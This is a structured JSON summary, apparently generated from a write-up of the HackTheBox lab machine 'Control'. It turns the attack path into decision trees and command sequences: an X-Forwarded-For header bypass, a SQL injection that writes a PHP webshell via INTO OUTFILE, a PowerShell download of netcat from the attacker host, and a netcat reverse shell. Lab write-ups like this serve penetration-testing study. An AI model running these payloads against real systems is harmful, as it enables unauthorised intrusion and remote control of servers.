{
  "writeup_id": "Htb_Control",
  "scenario_fingerprint": {
    "scenario_name": "windows_web_sqli_to_system",
    "primary_services": [
      "http",
      "mysql",
      "msrpc"
    ],
    "port_signature": "80+135+3306",
    "service_combination": "iis+mysql+rpc",
    "os_family": "windows_server",
    "environment_type": "web_application",
    "entry_vector": "sql_injection",
    "privilege_path": "webshell_to_service_registry_abuse",
    "attack_complexity": "hard",
    "estimated_time": "2-3 hours",
    "scenario_confidence": 0.88,
    "distinguishing_factors": [
      "http_header_bypass_required",
      "mysql_remote_access_restricted",
      "service_registry_write_permissions",
      "x_forwarded_for_bypass"
    ],
    "environmental_clues": [
      "iis_10_server",
      "admin_panel_behind_proxy_check",
      "internal_network_references",
      "mariadb_host_restrictions"
    ],
    "similar_scenarios": [
      "secnotes_htb_medium",
      "bounty_htb_easy"
    ],
    "unique_aspects": [
      "proxy_header_authentication",
      "service_registry_modification",
      "internal_ip_disclosure_in_comments"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "HTTP Header Bypass",
        "success_reason": "Application relied on X-Forwarded-For header for access control without proper validation",
        "prerequisite_indicators": [
          "access_denied_message_present",
          "proxy_references_in_source",
          "ip_addresses_in_comments"
        ],
        "recognition_patterns": [
          "proxy authentication error messages",
          "source code comments mentioning internal IPs",
          "header-based access control implementations"
        ],
        "failure_modes": [
          "proper_ip_validation",
          "certificate_based_auth",
          "no_header_bypass_possible"
        ],
        "environmental_factors": [
          "reverse_proxy_misconfiguration",
          "development_access_controls",
          "insufficient_header_validation"
        ],
        "success_probability": 0.75,
        "typical_timeframe": "10-30 minutes"
      },
      {
        "technique": "SQL Injection",
        "success_reason": "Unsanitized user input directly concatenated into SQL queries with verbose error messages",
        "prerequisite_indicators": [
          "database_driven_application",
          "user_input_parameters",
          "search_functionality_present"
        ],
        "recognition_patterns": [
          "SQL error messages in response",
          "different responses to quote characters",
          "union select statements work"
        ],
        "failure_modes": [
          "parameterized_queries",
          "input_sanitization",
          "error_message_suppression"
        ],
        "environmental_factors": [
          "verbose_error_reporting",
          "direct_sql_concatenation",
          "mariadb_backend"
        ],
        "success_probability": 0.92,
        "typical_timeframe": "15-45 minutes"
      },
      {
        "technique": "Service Registry Modification",
        "success_reason": "User had write permissions to service registry keys allowing service hijacking",
        "prerequisite_indicators": [
          "local_user_access",
          "windows_services_present",
          "registry_write_permissions"
        ],
        "recognition_patterns": [
          "registry key write access",
          "restartable services exist",
          "service binary path modification possible"
        ],
        "failure_modes": [
          "restricted_registry_permissions",
          "service_hardening",
          "no_restart_permissions"
        ],
        "environmental_factors": [
          "default_windows_permissions",
          "service_account_privileges",
          "insufficient_registry_hardening"
        ],
        "success_probability": 0.68,
        "typical_timeframe": "30-60 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "Internal IP address in source comments",
        "discovery_method": "Source code analysis",
        "why_critical": "Revealed proxy bypass IP for X-Forwarded-For header",
        "how_to_recognize": [
          "HTML comment blocks",
          "internal IP ranges (192.168.x.x)",
          "infrastructure references"
        ],
        "follow_up_actions": [
          "test_header_bypass_techniques",
          "enumerate_internal_network",
          "check_certificate_locations"
        ]
      },
      {
        "discovery": "Verbose SQL error messages",
        "discovery_method": "Single quote injection testing",
        "why_critical": "Enabled complete database enumeration and file system access",
        "how_to_recognize": [
          "MariaDB/MySQL error syntax",
          "column count mismatch errors",
          "SQLSTATE error codes"
        ],
        "follow_up_actions": [
          "determine_column_count",
          "enumerate_database_structure",
          "attempt_file_operations"
        ]
      },
      {
        "discovery": "Service registry write permissions",
        "discovery_method": "PowerShell registry enumeration",
        "why_critical": "Allowed service hijacking for privilege escalation",
        "how_to_recognize": [
          "registry key modification success",
          "service restart capabilities",
          "binary path write access"
        ],
        "follow_up_actions": [
          "identify_restartable_services",
          "modify_service_binary_path",
          "restart_service_for_execution"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "web_user",
        "escalation_method": "SQL_injection_to_webshell",
        "why_possible": "Database had file write permissions and web directory was writable",
        "recognition_signs": [
          "into_outfile_functionality",
          "web_directory_write_access",
          "php_execution_enabled"
        ],
        "exploitation_path": "SQLI → INTO OUTFILE → Webshell → System Shell"
      },
      {
        "privilege_level": "iusr_account",
        "escalation_method": "hash_cracking_to_user_pivot",
        "why_possible": "Weak password hashes stored in database were crackable",
        "recognition_signs": [
          "password_hashes_in_database",
          "weak_password_policies",
          "hash_format_crackable"
        ],
        "exploitation_path": "Hash Dump → Hashcat → User Credentials → Lateral Movement"
      },
      {
        "privilege_level": "local_user",
        "escalation_method": "service_registry_modification",
        "why_possible": "User had write access to service registry keys and restart permissions",
        "recognition_signs": [
          "registry_write_permissions",
          "service_restart_capability",
          "binary_path_modification"
        ],
        "exploitation_path": "Registry Enum → Service Modification → Service Restart → SYSTEM Shell"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found ports 80,135,3306 open on Windows host",
        "decision": "Focus on web application enumeration first, then database access",
        "reasoning": "Limited attack surface with filtered ports, web app likely entry point",
        "confidence": 0.85,
        "alternatives": [
          {
            "option": "mysql_direct_access",
            "when": "if web enumeration fails"
          },
          {
            "option": "rpc_enumeration",
            "when": "if other vectors exhausted"
          }
        ],
        "success_indicators": [
          "web_application_accessible",
          "admin_interface_discovered",
          "database_connection_possible"
        ],
        "next_decision": "bypass_access_controls"
      },
      {
        "step": 2,
        "situation": "Found admin interface with access restriction message",
        "decision": "Fuzz HTTP headers to bypass proxy restriction",
        "reasoning": "Error message indicates missing proxy header requirement",
        "confidence": 0.9,
        "prerequisites": [
          "admin_endpoint_identified",
          "access_denied_message"
        ],
        "success_indicators": [
          "http_200_response",
          "admin_interface_accessible"
        ],
        "failure_fallbacks": [
          "parameter_fuzzing",
          "directory_enumeration"
        ]
      },
      {
        "step": 3,
        "situation": "Admin interface accessible with X-Forwarded-For header",
        "decision": "Test all POST endpoints for SQL injection",
        "reasoning": "Database-driven application with multiple search/query functions",
        "confidence": 0.95,
        "prerequisites": [
          "admin_access_obtained",
          "multiple_php_endpoints"
        ],
        "success_indicators": [
          "sql_error_messages",
          "union_injection_successful"
        ],
        "failure_fallbacks": [
          "file_upload_testing",
          "command_injection_testing"
        ]
      }
    ],
    "branching_logic": {
      "if_sqli_confirmed": {
        "action": "escalate_to_file_write",
        "tools": [
          "burp_repeater",
          "union_select"
        ],
        "next_phase": "webshell_deployment"
      },
      "if_file_privileges_found": {
        "action": "write_webshell_via_sqli",
        "alternatives": [
          "into_outfile",
          "into_dumpfile"
        ],
        "decision_criteria": "based_on_web_root_permissions"
      },
      "if_webshell_successful": {
        "action": "enumerate_system_and_users",
        "purpose": "find_privilege_escalation_paths",
        "tools": [
          "system_commands",
          "user_enumeration"
        ]
      }
    },
    "optimization_rules": [
      {
        "rule": "always_check_source_comments_for_internal_ips",
        "reasoning": "often_contain_proxy_bypass_hints",
        "applicability": "web_application_testing"
      },
      {
        "rule": "test_x_forwarded_for_with_discovered_internal_ips",
        "reasoning": "common_proxy_bypass_technique",
        "applicability": "access_control_bypass"
      },
      {
        "rule": "prioritize_file_write_over_data_extraction_in_sqli",
        "reasoning": "direct_path_to_code_execution",
        "applicability": "sql_injection_with_file_privileges"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "HTTP Header Forgery",
        "mitre_id": "T1190",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          8080,
          8443
        ],
        "os_requirements": [
          "any"
        ],
        "environmental_prerequisites": [
          "web_application_present",
          "proxy_header_validation_bypass",
          "ip_whitelist_protection"
        ],
        "success_indicators": [
          "x_forwarded_for_bypass_works",
          "admin_panel_accessible",
          "different_response_size"
        ],
        "incompatible_with": [
          "proper_header_validation",
          "certificate_based_auth",
          "no_proxy_configuration"
        ],
        "confidence_boosters": [
          "source_code_comments_reveal_ips",
          "error_messages_mention_proxy",
          "internal_ip_ranges_in_comments"
        ],
        "typical_success_rate": 0.65,
        "estimated_time": "10-30 minutes"
      },
      {
        "technique": "SQL Injection",
        "mitre_id": "T1190",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443,
          3306,
          1433,
          5432
        ],
        "os_requirements": [
          "any"
        ],
        "environmental_prerequisites": [
          "web_application_with_database",
          "user_input_parameters",
          "dynamic_sql_queries"
        ],
        "success_indicators": [
          "sql_error_messages",
          "different_response_times",
          "union_select_successful"
        ],
        "incompatible_with": [
          "prepared_statements_only",
          "strict_input_validation",
          "waf_blocking_sql"
        ],
        "confidence_boosters": [
          "mysql_service_detected",
          "php_application_stack",
          "search_functionality_present"
        ],
        "typical_success_rate": 0.78,
        "estimated_time": "15-45 minutes"
      },
      {
        "technique": "Webshell Upload",
        "mitre_id": "T1505.003",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443
        ],
        "os_requirements": [
          "any"
        ],
        "environmental_prerequisites": [
          "sql_injection_available",
          "file_write_permissions",
          "web_directory_writable"
        ],
        "success_indicators": [
          "into_outfile_successful",
          "webshell_accessible_via_http",
          "command_execution_confirmed"
        ],
        "incompatible_with": [
          "file_upload_restrictions",
          "secure_file_permissions",
          "execution_prevention"
        ],
        "confidence_boosters": [
          "iis_server_detected",
          "mysql_file_privileges",
          "writable_web_directories"
        ],
        "typical_success_rate": 0.72,
        "estimated_time": "20-40 minutes"
      }
    ],
    "environmental_detectors": {
      "windows_iis": {
        "port_indicators": [
          80,
          443,
          135,
          445
        ],
        "service_indicators": [
          "http",
          "msrpc",
          "smb"
        ],
        "banner_indicators": [
          "Microsoft-IIS",
          "Windows Server"
        ],
        "confidence_threshold": 0.9
      },
      "mysql_database": {
        "port_indicators": [
          3306
        ],
        "service_indicators": [
          "mysql",
          "mariadb"
        ],
        "banner_indicators": [
          "MySQL",
          "MariaDB"
        ],
        "confidence_threshold": 0.85
      },
      "web_application": {
        "port_indicators": [
          80,
          443,
          8080,
          8443
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "technology_indicators": [
          "php",
          "asp",
          "jsp"
        ],
        "confidence_threshold": 0.9
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "http_header_bypass",
          "when": "admin_panel_blocked_and_proxy_mentioned",
          "reason": "often_reveals_admin_functionality"
        },
        {
          "attack": "sql_injection_testing",
          "when": "web_app_with_database_detected",
          "reason": "high_impact_data_access"
        }
      ],
      "medium_priority": [
        {
          "attack": "webshell_upload_via_sqli",
          "when": "sql_injection_confirmed_and_file_write_possible",
          "reason": "reliable_code_execution_path"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "HTTP Header Bypass",
        "mitre_id": "T1190",
        "category": "initial_access",
        "phase": "initial_access",
        "tools_used": [
          {
            "name": "wfuzz",
            "command_template": "wfuzz -c -w {wordlist} -u {url} -H \"FUZZ: {value}\" --hh {hide_chars}",
            "actual_command": "wfuzz -c -w headers -u http://10.10.10.167/admin.php -H \"FUZZ: 192.168.4.28\" --hh 89",
            "output_pattern": "200 response with X-Forwarded-For header",
            "effectiveness_rating": 4,
            "reliability": 0.85
          }
        ],
        "prerequisites": [
          "web_application_accessible",
          "header_based_access_control",
          "internal_ip_hint_available"
        ],
        "success_indicators": [
          "http_200_response_received",
          "admin_panel_accessible",
          "content_length_significantly_different"
        ],
        "common_failures": [
          "incorrect_internal_ip_used",
          "wrong_header_name",
          "application_not_vulnerable"
        ],
        "follow_up_techniques": [
          "sql_injection",
          "admin_panel_enumeration"
        ],
        "time_investment": "10-20 minutes",
        "skill_level": "beginner"
      },
      {
        "name": "SQL Injection to File Write",
        "mitre_id": "T1190",
        "category": "initial_access",
        "phase": "exploitation",
        "tools_used": [
          {
            "name": "burp_suite",
            "command_template": "POST request with UNION injection",
            "actual_command": "productName=Asus' union select '<?php system($_GET[\\'cmd\\']); ?>',2,3,4,5,6 into outfile 'c:/inetpub/wwwroot/_0xdf.php'#",
            "output_pattern": "File already exists error on second attempt",
            "effectiveness_rating": 5,
            "reliability": 0.9
          }
        ],
        "prerequisites": [
          "sql_injection_vulnerability",
          "file_write_privileges",
          "web_root_path_known"
        ],
        "success_indicators": [
          "webshell_file_created",
          "command_execution_achieved",
          "file_already_exists_error_on_retry"
        ],
        "common_failures": [
          "insufficient_database_privileges",
          "incorrect_web_root_path",
          "file_system_permissions_deny_write"
        ],
        "follow_up_techniques": [
          "webshell_command_execution",
          "reverse_shell_establishment"
        ],
        "time_investment": "15-30 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "Webshell to Reverse Shell",
        "mitre_id": "T1059.003",
        "category": "execution",
        "phase": "exploitation",
        "tools_used": [
          {
            "name": "curl",
            "command_template": "curl '{target}/_0xdf.php?cmd={command}'",
            "actual_command": "curl '10.10.10.167/_0xdf.php?cmd=powershell+wget+http://10.10.14.4/nc64.exe+-outfile+\\windows\\temp\\nc.exe'",
            "effectiveness_rating": 5,
            "reliability": 0.95
          },
          {
            "name": "netcat",
            "command_template": "\\windows\\temp\\nc.exe -e cmd {attacker_ip} {port}",
            "actual_command": "\\windows\\temp\\nc.exe -e cmd 10.10.14.4 443",
            "effectiveness_rating": 5,
            "reliability": 0.98
          }
        ],
        "prerequisites": [
          "webshell_access",
          "outbound_network_connectivity",
          "file_upload_capability"
        ],
        "success_indicators": [
          "netcat_binary_downloaded",
          "reverse_shell_connection_established",
          "interactive_command_execution"
        ],
        "common_failures": [
          "antivirus_blocking_netcat",
          "firewall_blocking_outbound",
          "insufficient_privileges_for_execution"
        ],
        "follow_up_techniques": [
          "privilege_escalation",
          "credential_harvesting",
          "lateral_movement"
        ],
        "time_investment": "5-10 minutes",
        "skill_level": "beginner"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "wfuzz",
        "use_case": "http_header_fuzzing",
        "effectiveness_rating": 4,
        "reliability": 0.85,
        "learning_curve": "low",
        "essential_for": [
          "web_application_testing"
        ],
        "alternatives": [
          "burp_intruder",
          "ffuf"
        ],
        "best_practices": [
          "use_hide_chars_to_filter_common_responses",
          "test_with_internal_ip_addresses_from_source_hints",
          "maintain_comprehensive_header_wordlists"
        ]
      },
      {
        "tool": "burp_suite",
        "use_case": "sql_injection_exploitation",
        "effectiveness_rating": 5,
        "reliability": 0.95,
        "learning_curve": "medium",
        "essential_for": [
          "web_application_penetration_testing"
        ],
        "alternatives": [
          "sqlmap",
          "manual_curl"
        ],
        "best_practices": [
          "use_repeater_for_iterative_testing",
          "leverage_render_tab_for_formatted_output",
          "test_union_injections_systematically"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "header_bypass_to_shell",
        "steps": [
          {
            "step": 1,
            "command": "wfuzz -c -w headers -u http://10.10.10.167/admin.php -H \"FUZZ: 192.168.4.28\" --hh 89",
            "purpose": "Identify bypass header",
            "expected_output": "X-Forwarded-For returns HTTP 200"
          },
          {
            "step": 2,
            "command": "productName=Asus' union select 1,2,3,4,5,6#",
            "purpose": "Confirm column count for UNION injection",
            "expected_output": "Table with 6 columns displayed"
          },
          {
            "step": 3,
            "command": "productName=Asus' union select '<?php system($_GET[\\'cmd\\']); ?>',2,3,4,5,6 into outfile 'c:/inetpub/wwwroot/_0xdf.php'#",
            "purpose": "Write webshell to web root",
            "expected_output": "File created successfully"
          },
          {
            "step": 4,
            "command": "curl '10.10.10.167/_0xdf.php?cmd=powershell+wget+http://10.10.14.4/nc64.exe+-outfile+\\windows\\temp\\nc.exe'",
            "purpose": "Download netcat binary",
            "expected_output": "HTTP request to attacker server"
          },
          {
            "step": 5,
            "command": "curl '10.10.10.167/_0xdf.php?cmd=\\windows\\temp\\nc.exe+-e+cmd+10.10.14.4+443'",
            "purpose": "Execute reverse shell",
            "expected_output": "Shell as nt authority\\iusr"
          }
        ],
        "success_rate": 0.82,
        "typical_duration": "30-60 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Control",
      "difficulty": "Hard",
      "os": "Windows Server 2016/2019",
      "platform": "HackTheBox",
      "release_date": "2019-11-23",
      "author": "TRX",
      "estimated_time": "3-4 hours"
    },
    "intelligence_metadata": {
      "attack_complexity": "high",
      "skill_level_required": "intermediate",
      "primary_attack_vectors": [
        "web_application",
        "sql_injection",
        "registry_manipulation"
      ],
      "key_vulnerabilities": [
        "header_bypass",
        "sql_injection",
        "service_registry_permissions"
      ],
      "environment_type": "windows_web_server",
      "real_world_relevance": "high",
      "learning_value": [
        "header_manipulation",
        "sql_injection_to_shell",
        "windows_registry_exploitation",
        "service_modification"
      ],
      "prerequisite_knowledge": [
        "web_application_testing",
        "sql_injection",
        "windows_services",
        "powershell"
      ]
    },
    "categorization": {
      "primary_category": "web_application",
      "subcategories": [
        "sql_injection",
        "privilege_escalation",
        "registry_manipulation"
      ],
      "attack_types": [
        "initial_access",
        "credential_access",
        "privilege_escalation"
      ],
      "defensive_lessons": [
        "input_validation",
        "header_validation",
        "service_permissions_hardening",
        "registry_access_control"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Jeeves",
        "Bastard",
        "Optimum"
      ],
      "similarity_reasons": [
        "windows_web_server",
        "service_exploitation",
        "registry_manipulation"
      ],
      "unique_aspects": [
        "header_bypass_authentication",
        "mysql_integration",
        "service_registry_write_permissions"
      ],
      "difficulty_factors": [
        "complex_privilege_escalation",
        "windows_permissions_analysis",
        "service_modification_techniques"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-05T01:38:39.860875",
    "original_file": "0xdf_writeups/Htb Control.md",
    "content_length": 39906,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 1.0,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 1.0,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}